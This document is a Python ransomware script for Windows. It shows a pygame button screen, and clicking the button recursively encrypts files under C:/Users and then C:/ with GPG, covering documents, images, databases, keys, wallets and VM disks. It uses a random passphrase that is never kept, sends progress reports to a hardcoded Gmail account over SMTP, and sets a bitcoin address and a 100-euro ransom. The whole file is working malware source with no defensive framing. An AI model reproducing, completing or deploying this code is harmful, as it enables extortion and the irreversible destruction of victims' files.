import os
import sys
import subprocess
import random
import string
import re
from pyDes import des
import glob
import os.path
import gnupg
import pdb
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText


import pygame
from pygame.locals import *
import pygame_textinput

def Windows():
    path=('C:')
    text1=('C:/Users/*')
    text2=('C:/*')
    verif=""
    textexe='ejecutado'
    textfin='fin users'
    textall='fin all'
    s = string.ascii_lowercase + string.digits
    pwd = str(''.join(random.sample(s, 8)))
    t=string.ascii_lowercase
    idd =str(''.join(random.sample(s, 10)))

    #inicialisamos pygame
    pygame.init()
    pygame.font.init()

    #creation fenetre vide
    fenetre = pygame.display.set_mode((640, 480))

    #Chargement et collage du fond
    fond = pygame.image.load("background.jpg").convert()

    #chargement button
    image = pygame.image.load('button.jpg')
    image = pygame.transform.scale(image, (200, 100))
    image_rect = image.get_rect()
    image_rect.topleft = (230,360)

    #chargement fond texte
    image2 = pygame.image.load('text.jpg')
    image2 = pygame.transform.scale(image2, (400, 35))
    image2_rect = image2.get_rect()
    image2_rect.topleft = (135,320)

    #Input
    text_color=(255, 255, 255)
    font_size=10
    antialias=True

    textI = pygame_textinput.TextInput()
    textI.text_color=text_color
    
    #Rafraîchissement de l'écran
    pygame.display.flip()
    fenetre.blit(fond, (0,0))
    fenetre.blit(image, image_rect)
    fenetre.blit(image2, image2_rect)

    #BOUCLE INFINIE
    salir = False
    aff=0
    #Boucle infinie
    while not salir:
	if aff==0:
		events = pygame.event.get()
		fenetre.blit(image2, image2_rect)
		fenetre.blit(textI.get_surface(), (138, 325))
		textI.update(events)
		pygame.display.flip()
    		pygame.display.update()

	elif aff==1:
		pygame.event.wait()
	

    	for event in events:
        	if event.type == pygame.QUIT:
            		salir = True
			break

		elif event.type == MOUSEBUTTONUP:              
                	if event.button == 1:                      
                    		if image_rect.collidepoint(event.pos):
					if aff==0:
						mail(textexe)
						#load
						fond = pygame.image.load("loading.jpg").convert()
						fond = pygame.transform.scale(fond, (640, 480))
                        			fenetre.blit(fond, (0,0))
						pygame.display.flip()
						pygame.display.update()

    						crypt(text1, pwd, path, bitcoin, price,verif)
    						mail(textfin)
						crypt(text2, pwd, path, bitcoin, price,verif)
						mail(textall)

                        			fond = pygame.image.load("message.jpg").convert()
						fond = pygame.transform.scale(fond, (640, 480))
                        			fenetre.blit(fond, (0,0))
						aff=1
                        			pygame.display.flip()
						pygame.display.update()


bitcoin='18SXEt2zLcmYKCbZ6fx36QrmA2NuPAE9kq'
price='100 Euros'

def crypt(text, pwd, path, bitcoin, price,verif ):
    l= glob.glob(text)
    for i in l:
        if os.path.isdir(i):
            crypt(i+'/*',pwd, path,bitcoin, price,verif)
    for i in l:
        if os.path.splitext(i)[1]=='.JPG' or os.path.splitext(i)[1]=='.PDF' or os.path.splitext(i)[1]=='.rss' or os.path.splitext(i)[1]=='.mp3' or os.path.splitext(i)[1]=='.msi' or os.path.splitext(i)[1]=='.DAT' or os.path.splitext(i)[1]=='.WALLET.dat' or os.path.splitext(i)[1]=='.dat' or os.path.splitext(i)[1]=='.wallet.dat' or os.path.splitext(i)[1]=='.asc' or os.path.splitext(i)[1]=='.key' or os.path.splitext(i)[1]=='.crt' or os.path.splitext(i)[1]=='.csr' or os.path.splitext(i)[1]=='.pem' or os.path.splitext(i)[1]=='.odt' or os.path.splitext(i)[1]=='.ott' or os.path.splitext(i)[1]=='.sxw' or os.path.splitext(i)[1]=='.stw' or os.path.splitext(i)[1]=='.ppt' or os.path.splitext(i)[1]=='.PPT' or os.path.splitext(i)[1]=='.RTF' or os.path.splitext(i)[1]=='.uot' or os.path.splitext(i)[1]=='.CSV' or os.path.splitext(i)[1]=='.max' or os.path.splitext(i)[1]=='.DOT' or os.path.splitext(i)[1]=='.dotx' or os.path.splitext(i)[1]=='.dotm' or os.path.splitext(i)[1]=='.hwp' or os.path.splitext(i)[1]=='.ods' or os.path.splitext(i)[1]=='.ots' or os.path.splitext(i)[1]=='.sxc' or os.path.splitext(i)[1]=='.stc' or os.path.splitext(i)[1]=='.dif' or os.path.splitext(i)[1]=='.xlc' or os.path.splitext(i)[1]=='.xlm' or os.path.splitext(i)[1]=='.xml' or os.path.splitext(i)[1]=='.xlt' or os.path.splitext(i)[1]=='.xlw' or os.path.splitext(i)[1]=='.slk' or os.path.splitext(i)[1]=='.xlsb' or os.path.splitext(i)[1]=='.xltm' or os.path.splitext(i)[1]=='.xltx' or os.path.splitext(i)[1]=='.wks' or os.path.splitext(i)[1]=='.odp' or os.path.splitext(i)[1]=='.opt' or os.path.splitext(i)[1]=='.sxi' or os.path.splitext(i)[1]=='.sti' or os.path.splitext(i)[1]=='.pps' or os.path.splitext(i)[1]=='.pot' or os.path.splitext(i)[1]=='.sxd' or os.path.splitext(i)[1]=='.std' or os.path.splitext(i)[1]=='.pptm' or os.path.splitext(i)[1]=='.pptx' or os.path.splitext(i)[1]=='.potm' or os.path.splitext(i)[1]=='.`potx' or os.path.splitext(i)[1]=='.uo' or os.path.splitext(i)[1]=='.odg' or os.path.splitext(i)[1]=='.otg' or os.path.splitext(i)[1]=='.sxm' or os.path.splitext(i)[1]=='.mml' or os.path.splitext(i)[1]=='.docb' or os.path.splitext(i)[1]=='.ppam' or os.path.splitext(i)[1]=='.ppsx' or os.path.splitext(i)[1]=='.ppsm' or os.path.splitext(i)[1]=='.sldx' or os.path.splitext(i)[1]=='.sldm' or os.path.splitext(i)[1]=='.ms11' or os.path.splitext(i)[1]=='.lay' or os.path.splitext(i)[1]=='.lay6' or os.path.splitext(i)[1]=='.asc' or os.path.splitext(i)[1]=='.SQLITE3' or os.path.splitext(i)[1]=='.SQLITEDB' or os.path.splitext(i)[1]=='.sql' or os.path.splitext(i)[1]=='.mdb' or os.path.splitext(i)[1]=='.dbf' or os.path.splitext(i)[1]=='.odb' or os.path.splitext(i)[1]=='.frm' or os.path.splitext(i)[1]=='.MYD' or os.path.splitext(i)[1]=='.MYI' or os.path.splitext(i)[1]=='.ibd' or os.path.splitext(i)[1]=='.mdf' or os.path.splitext(i)[1]=='.ldf' or os.path.splitext(i)[1]=='.cpp' or os.path.splitext(i)[1]=='.pas' or os.path.splitext(i)[1]=='.asm' or os.path.splitext(i)[1]=='.vbs' or os.path.splitext(i)[1]=='.dip' or os.path.splitext(i)[1]=='.dch' or os.path.splitext(i)[1]=='.sch' or os.path.splitext(i)[1]=='.brd' or os.path.splitext(i)[1]=='.java' or os.path.splitext(i)[1]=='.jar' or os.path.splitext(i)[1]=='.class' or os.path.splitext(i)[1]=='.bat' or os.path.splitext(i)[1]=='.cmd' or os.path.splitext(i)[1]=='.psd' or os.path.splitext(i)[1]=='.NEF' or os.path.splitext(i)[1]=='.tiff' or os.path.splitext(i)[1]=='.tif' or os.path.splitext(i)[1]=='.cgm' or os.path.splitext(i)[1]=='.raw' or os.path.splitext(i)[1]=='.gif' or os.path.splitext(i)[1]=='.svg' or os.path.splitext(i)[1]=='.djvu' or os.path.splitext(i)[1]=='.djv' or os.path.splitext(i)[1]=='.rar' or os.path.splitext(i)[1]=='.tgz' or os.path.splitext(i)[1]=='.tar' or os.path.splitext(i)[1]=='.bak' or os.path.splitext(i)[1]=='.tar.bz2' or os.path.splitext(i)[1]=='.PAQ' or os.path.splitext(i)[1]=='.aes' or os.path.splitext(i)[1]=='.gpg' or os.path.splitext(i)[1]=='.vmx' or os.path.splitext(i)[1]=='.vmdk' or os.path.splitext(i)[1]=='.vdi' or os.path.splitext(i)[1]=='.qcow2' or os.path.splitext(i)[1]=='.fla' or os.path.splitext(i)[1]=='.asf' or os.path.splitext(i)[1]=='.wma' or os.path.splitext(i)[1]=='.mid' or os.path.splitext(i)[1]=='.locky' or os.path.splitext(i)[1]=='.png' or os.path.splitext(i)[1]=='.jpeg' or os.path.splitext(i)[1]=='.xslx' or os.path.splitext(i)[1]=='.xls' or os.path.splitext(i)[1]=='.docm' or os.path.splitext(i)[1]=='.docx' or os.path.splitext(i)[1]=='.doc' or os.path.splitext(i)[1]=='.wmv' or os.path.splitext(i)[1]=='.vob' or os.path.splitext(i)[1]=='.swf' or os.path.splitext(i)[1]=='.mpeg' or os.path.splitext(i)[1]=='.mpg' or os.path.splitext(i)[1]=='.mp4' or os.path.splitext(i)[1]=='.mov' or os.path.splitext(i)[1]=='.mkv' or os.path.splitext(i)[1]=='.file' or os.path.splitext(i)[1]=='.eot' or os.path.splitext(i)[1]=='.js' or os.path.splitext(i)[1]=='.htm' or os.path.splitext(i)[1]=='.flv' or os.path.splitext(i)[1]=='.avi' or os.path.splitext(i)[1]=='.jsp' or os.path.splitext(i)[1]=='.asp' or os.path.splitext(i)[1]=='.php' or os.path.splitext(i)[1]=='.exe' or os.path.splitext(i)[1]=='.contact' or os.path.splitext(i)[1]=='.bmp' or os.path.splitext(i)[1]=='.rtf' or os.path.splitext(i)[1]=='.txt' or os.path.splitext(i)[1]=='.jpg' or os.path.splitext(i)[1]=='.zip' or os.path.splitext(i)[1]=='.pdf'or os.path.splitext(i)[1]=='.PNG':
            gpg = gnupg.GPG(gnupghome='new',gpgbinary="gnupg\\bin\\gpg.exe")
            try:
                lsvari= (i.split('\\'))
                if(lsvari.index("v2.23") >0):
                    pass
            except(ValueError):    
                input_data = gpg.gen_key_input(key_type="RSA",key_length=1024,passphrase=pwd)
                try:
                    archivo = open(i,"rb")
                    data = archivo.read()
                    datacifrada = gpg.encrypt(data, pwd)
                    archivo.close()
                    archivocifrado = open(i, "wb")
                    archivocifrado.write(datacifrada.data)
                    archivocifrado.close()
                except (IOError, RuntimeError, TypeError, NameError, OSError):
                    pass


def mail(text):
    msg = MIMEMultipart()
    msg['From'] = 'patatipatatabad@gmail.com'
    msg['To'] = 'patatipatatabad@gmail.com'
    msg['Subject'] = 'Hackthat' 
    message = text
    msg.attach(MIMEText(message))
    mailserver = smtplib.SMTP('smtp.gmail.com', 587)
    mailserver.ehlo()
    mailserver.starttls()
    mailserver.ehlo()
    mailserver.login('patatipatatabad@gmail.com', 'PASS')
    mailserver.sendmail('patatipatatabad@gmail.com', 'patatipatatabad@gmail.com', msg.as_string())
    mailserver.quit()


Windows()
